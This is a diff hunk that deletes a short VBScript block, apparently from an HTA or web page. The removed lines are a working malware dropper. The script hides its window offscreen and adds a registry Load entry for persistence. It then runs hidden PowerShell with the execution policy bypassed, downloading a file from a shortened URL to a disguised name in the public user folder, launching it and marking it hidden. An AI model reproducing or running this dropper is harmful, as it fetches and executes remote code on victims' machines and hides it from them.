@@ -1,8 +1,0 @@
-<script language="VBScript">
-window.moveTo -3000, -3000
-Dim MaCommande,Ws,Ret
-Set Ws = CreateObject("wscript.Shell")
-Ws.RegWrite "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load", "C:\Users\Public\igfx.exe", "REG_SZ"
-Ws.Run "cmd /c powershell.exe -ExecutionPolicy bypass -noprofile -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('https://goo.gl/HMkhkk','C:\Users\Public\igfx.exe'); Start-Process C:\Users\Public\igfx.exe ;$a = get-item C:\Users\Public\igfx.exe; $a.attributes = 'Hidden';",0
-window.close()
-</script>
